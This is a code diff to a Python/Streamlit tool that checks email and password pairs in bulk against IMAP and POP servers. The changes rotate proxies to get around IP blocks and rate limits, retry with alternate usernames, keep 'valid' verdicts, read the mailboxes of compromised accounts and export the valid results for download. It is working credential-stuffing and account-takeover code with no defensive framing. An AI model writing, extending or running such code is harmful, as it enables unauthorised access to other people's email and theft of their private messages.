 def imap_starttls_once(email, password, server, proxy_str=None, insecure=True, port=143, attempt_timeout=None):
     to = attempt_timeout or CFG["TIMEOUT"]
@@ -2919,7 +2860,6 @@ def imap_starttls_once(email, password, server, proxy_str=None, insecure=True, p
             except Exception:
                 pass
 
-
 def imap_plain_once(email, password, server, proxy_str=None, port=143, attempt_timeout=None):
     to = attempt_timeout or CFG["TIMEOUT"]
     mail = None
@@ -2941,7 +2881,6 @@ def imap_plain_once(email, password, server, proxy_str=None, port=143, attempt_t
                 mail.logout()
             except Exception:
                 pass
-
 
 def pop_once(email, password, server, proxy_str=None, insecure=True, port=995, attempt_timeout=None):
     to = attempt_timeout or CFG["TIMEOUT"]
@@ -2967,7 +2906,6 @@ def pop_once(email, password, server, proxy_str=None, insecure=True, port=995, a
             except Exception:
                 pass
 
-
 def pop_starttls_once(email, password, server, proxy_str=None, insecure=True, port=110, attempt_timeout=None):
     to = attempt_timeout or CFG["TIMEOUT"]
     mail = None
@@ -2990,7 +2928,6 @@ def pop_starttls_once(email, password, server, proxy_str=None, insecure=True, po
                 mail.quit()
             except Exception:
                 pass
-
 
 def pop_plain_once(email, password, server, proxy_str=None, port=110, attempt_timeout=None):
     to = attempt_timeout or CFG["TIMEOUT"]
@@ -3015,7 +2952,6 @@ def pop_plain_once(email, password, server, proxy_str=None, port=110, attempt_ti
                 mail.quit()
             except Exception:
                 pass
-
 
 def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
     users = username_candidates(target_email)
@@ -3048,7 +2984,6 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
                             pass
                     continue
     return False, None, ""
-
 
 def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
     mail = None
@@ -3083,7 +3018,6 @@ def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
                 pass
         return [f"Error reading mailbox: {str(e)}"]
 
-
 # ============================================================================
 # MAIN ORCHESTRATOR  (IMAP / POP only — SMTP lives in the opt-in pre-check)
 # ============================================================================
@@ -3103,6 +3037,19 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
     t_start = time.time()
     retryable = False
     dns_ok = True
+
+    # --- v13.8: VERDICT RETENTION ------------------------------------------
+    # The FIRST definitive verdict any host hands back (VALID / WRONG_PASSWORD /
+    # NEED_APP_PASSWORD) is kept for the whole account. A later timeout, a proxy
+    # rotation or a dead direct pass must never clobber it. Without this, a host
+    # that says "wrong password", followed by a local-part retry that times out,
+    # ended up as CONNECTION_FAILED.
+    best_verdict = {"status": None, "detail": ""}
+    # --- v13.8: 407 STORM BREAKER ------------------------------------------
+    # 407 is proxy-level. After 3 consecutive 407s on the SAME host we stop
+    # burning proxies on it and go straight to the direct pass.
+    force_direct = {"flag": False}
+    host_407 = {}
     try:
         if conf.get("type") == "zero_access":
             trace_logs.append("Architecture: Zero-Access / Bridge detected.")
@@ -3115,13 +3062,23 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         max_hosts = max(1, int(CFG.get("MAX_HOSTS_PER_DOMAIN", 3)))
 
         # SMTP no longer competes for this budget — the ladder gets nearly all of it.
+        # v13.8: the proxy pass is now capped at 55% of the budget (was 72%), so the
+        # DIRECT pass always keeps ~45% of the wall clock for hosts that only
+        # answer over direct.
         budget = max(12.0, float(CFG.get("ACCOUNT_DEADLINE", 45)) * 0.95)
-        primary_deadline = t_start + (budget * 0.72)
+        proxy_deadline = t_start + (budget * 0.55)
         hard_deadline = t_start + budget
         per_attempt = max(3.0, min(float(CFG.get("TIMEOUT", 10)), budget / max(5.0, max_hosts + 3.0)))
 
         users = username_candidates(email) if try_alt_user else [email]
         primary_user = users[0]
+
+        def note_verdict(st_val, detail):
+            """Retain the first definitive verdict seen for this account."""
+            if best_verdict["status"] is None and st_val in (VALID, WRONG, APP):
+                best_verdict["status"] = st_val
+                best_verdict["detail"] = detail
+                trace_logs.append(f"Verdict retained for this account: [{st_val}] ({detail})")
 
         px = None
         if proxy_pool and proxy_mode != "off":
@@ -3198,7 +3155,8 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     trace_logs.append(f"{px_tag(px_used)} Skip {tls_mode.upper()} {server}:{port} (implicit TLS already timed out)")
                     continue
 
-                rotations_left = 4 if (px_used and proxy_mode != "off") else 0
+                # v13.8: 2 rotations per host (was 4) — the pool must not eat the budget.
+                rotations_left = 2 if (px_used and proxy_mode != "off") else 0
                 seen_px = {px_used} if px_used else set()
 
                 while True:
@@ -3209,11 +3167,13 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     trace_logs.append(f"{px_tag(px_used)} Attempting {proto} {tls_mode.upper()} -> Host: {server}:{port}")
                     server_level_fail = False
                     rotate_now = False
+                    err_text = ""
 
                     for u_idx, user in enumerate(users):
                         try:
                             do_attempt(proto, server, port, tls_mode, user, px_used, attempt_to)
                             record_proxy_attempt(px_used, success=True)
+                            note_verdict(VALID, f"{proto} {server}:{port}")
                             note = "" if user == primary_user else f" | User: {user} (local-part)"
                             trace_logs.append(f"{px_tag(px_used)} Post-auth {proto} verification OK on {server}:{port}{note}")
                             return (server, VALID,
@@ -3221,40 +3181,52 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                     px_used, trace_logs), had_net_fail, saw_retryable
 
                         except ssl.SSLError as ssl_err:
+                            err_text = str(ssl_err)
                             st_val = classify_error(ssl_err, domain)
                             if st_val == FAILED:
                                 had_net_fail = True
                             record_proxy_attempt(px_used, success=False, is_network_error=(st_val == FAILED))
-                            trace_logs.append(f"{px_tag(px_used)} -> TLS FAILED {proto} {server}:{port}: {str(ssl_err)[:90]} [Classified: {st_val}]")
+                            trace_logs.append(f"{px_tag(px_used)} -> TLS FAILED {proto} {server}:{port}: {err_text[:90]} [Classified: {st_val}]")
+                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}")
                             server_level_fail = True
-                            rotate_now = _is_proxy_level_error(str(ssl_err)) or st_val == FAILED
+                            rotate_now = _is_proxy_level_error(err_text) or st_val == FAILED
 
                         except (socket.timeout, TimeoutError) as to_err:
+                            err_text = str(to_err)
                             if proto == "IMAP" and tls_mode == "ssl":
                                 timed_out_hosts.add(server)
                             had_net_fail = True
                             record_proxy_attempt(px_used, success=False, is_network_error=True)
-                            trace_logs.append(f"{px_tag(px_used)} -> TIMEOUT {proto} {server}:{port}: {str(to_err)[:90]} [Classified: {FAILED}]")
+                            trace_logs.append(f"{px_tag(px_used)} -> TIMEOUT {proto} {server}:{port}: {err_text[:90]} [Classified: {FAILED}]")
                             server_level_fail = True
                             rotate_now = True
 
                         except (socket.error, ConnectionRefusedError) as sock_err:
+                            err_text = str(sock_err)
                             had_net_fail = True
                             record_proxy_attempt(px_used, success=False, is_network_error=True)
-                            trace_logs.append(f"{px_tag(px_used)} -> SOCKET FAILED {proto} {server}:{port}: {str(sock_err)[:90]} [Classified: {FAILED}]")
+                            trace_logs.append(f"{px_tag(px_used)} -> SOCKET FAILED {proto} {server}:{port}: {err_text[:90]} [Classified: {FAILED}]")
                             server_level_fail = True
                             rotate_now = True
 
                         except (imaplib.IMAP4.error, poplib.error_proto) as proto_err:
+                            err_text = str(proto_err)
                             st_val = classify_error(proto_err, domain)
                             record_proxy_attempt(px_used, success=False, is_network_error=False)
-                            trace_logs.append(f"{px_tag(px_used)} -> AUTH {proto} {server}:{port}: {str(proto_err)[:90]} [Classified: {st_val}]")
+                            trace_logs.append(f"{px_tag(px_used)} -> AUTH {proto} {server}:{port}: {err_text[:90]} [Classified: {st_val}]")
+                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}")
                             if st_val == APP:
                                 return (None, APP, f"{px_tag(px_used)} {proto} {server} -> {st_val}", px_used, trace_logs), had_net_fail, saw_retryable
                             if st_val == RETRY:
                                 saw_retryable = True
                                 server_level_fail = True
-                                rotate_now = True
+                                # v13.8: 'Lookup failed' is a host routing miss, not a
+                                # proxy fault -> advance to the next host, no rotation.
+                                if "lookup failed" in err_text.lower():
+                                    rotate_now = False
+                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on {server}:{port} -> advancing to next host (no proxy rotation)")
+                                else:
+                                    rotate_now = True
                             elif u_idx + 1 < len(users) and st_val in (WRONG, UNKNOWN):
                                 trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same host as local-part '{users[u_idx + 1]}'")
                                 continue
@@ -3264,8 +3236,9 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                 server_level_fail = True
 
                         except Exception as e:
+                            err_text = str(e)
                             st_val = classify_error(e, domain)
-                            proxy_level = _is_proxy_level_error(str(e))
+                            proxy_level = _is_proxy_level_error(err_text)
                             if _is_timeout(e):
                                 if proto == "IMAP" and tls_mode == "ssl":
                                     timed_out_hosts.add(server)
@@ -3273,13 +3246,18 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             if st_val == FAILED:
                                 had_net_fail = True
                             record_proxy_attempt(px_used, success=False, is_network_error=(st_val == FAILED))
-                            trace_logs.append(f"{px_tag(px_used)} -> FAILED {proto} {server}:{port}: {str(e)[:90]} [Classified: {st_val}]")
+                            trace_logs.append(f"{px_tag(px_used)} -> FAILED {proto} {server}:{port}: {err_text[:90]} [Classified: {st_val}]")
+                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}")
                             if st_val == APP:
                                 return (None, APP, f"{px_tag(px_used)} {proto} {server} -> {st_val}", px_used, trace_logs), had_net_fail, saw_retryable
                             if st_val == RETRY:
                                 saw_retryable = True
                                 server_level_fail = True
-                                rotate_now = True
+                                if "lookup failed" in err_text.lower():
+                                    rotate_now = False
+                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on {server}:{port} -> advancing to next host (no proxy rotation)")
+                                else:
+                                    rotate_now = True
                             elif u_idx + 1 < len(users) and st_val in (WRONG, UNKNOWN):
                                 trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same host as local-part '{users[u_idx + 1]}'")
                                 continue
@@ -3291,6 +3269,16 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
 
                         if server_level_fail:
                             break
+
+                    # --- v13.8: 407 storm breaker ---------------------------
+                    if "407" in err_text:
+                        host_407[server] = host_407.get(server, 0) + 1
+                        if host_407[server] >= 3:
+                            trace_logs.append(
+                                f"{px_tag(px_used)} 407 storm: {host_407[server]} consecutive proxy-auth "
+                                f"failures on {server} -> skipping the remaining proxies, going DIRECT.")
+                            force_direct["flag"] = True
+                            return None, had_net_fail, saw_retryable
 
                     if rotate_now and px_used and rotations_left > 0:
                         newpx = sample_alive_proxy(exclude=seen_px, domain=domain)
@@ -3305,11 +3293,15 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
 
             return None, had_net_fail, saw_retryable
 
-        result, net_fail, retryable = run_plan(px, deadline_ts=primary_deadline)
+        result, net_fail, retryable = run_plan(px, deadline_ts=proxy_deadline)
         if result:
             return result
 
-        if px and (net_fail or retryable) and (proxy_mode == "fallback" or CFG.get("RETRY_CONNECTION_FAILED")):
+        if force_direct["flag"]:
+            trace_logs.append("407 storm breaker tripped -> bypassing the rest of the proxy pool and running the DIRECT pass now.")
+
+        if px and (net_fail or retryable or force_direct["flag"]) and (
+                proxy_mode == "fallback" or CFG.get("RETRY_CONNECTION_FAILED") or force_direct["flag"]):
             direct_hosts = [h for h in imap_hosts if fast_fail_dns_check(h)]
             if not direct_hosts:
                 direct_hosts = [h for h in pop_hosts if fast_fail_dns_check(h)]
@@ -3336,16 +3328,27 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         trace_logs.append(f"Critical Exception in runner: {str(e)}")
         if CFG.get("FAST_MODE", True):
             failed_domain_cache[domain] = time.time()
+        # v13.8: a retained verdict still outranks a hard crash.
+        if best_verdict["status"] is not None:
+            return None, best_verdict["status"], best_verdict["detail"] or "retained verdict", None, trace_logs
         return None, FAILED, str(e)[:40], None, trace_logs
 
     if CFG.get("FAST_MODE", True):
         failed_domain_cache[domain] = time.time()
+
+    # --- v13.8: RETAINED VERDICT WINS -------------------------------------
+    # A definitive answer collected anywhere in the ladder outranks any later
+    # timeout / retryable / DNS / connection failure.
+    if best_verdict["status"] is not None:
+        trace_logs.append(
+            f"Ladder exhausted with no live answer -> returning retained verdict [{best_verdict['status']}]."
+        )
+        return None, best_verdict["status"], best_verdict["detail"] or "retained verdict", None, trace_logs
     if retryable:
         return None, RETRY, "retryable (proxy / IP-block / rate-limit)", None, trace_logs
     if not dns_ok:
         return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs
     return None, FAILED, "all hosts failed", None, trace_logs
-
 
 # ============================================================================
 # EXECUTION TRIGGER
@@ -3778,7 +3781,6 @@ if start_engine_btn:
         except Exception as ex:
             str_lit.error(f"Error compiling results export files: {ex}")
 
-
 # ============================================================================
 # PERSISTENT RESULTS SUMMARY
 # ============================================================================
@@ -3861,7 +3863,6 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
     if zip_bytes_copy and zip_name_copy:
         str_lit.download_button("📦 Download All Results (.zip Package)", data=zip_bytes_copy,
                                 file_name=zip_name_copy, mime="application/zip")
-
 
 # ============================================================================
 # MAILBOX READER
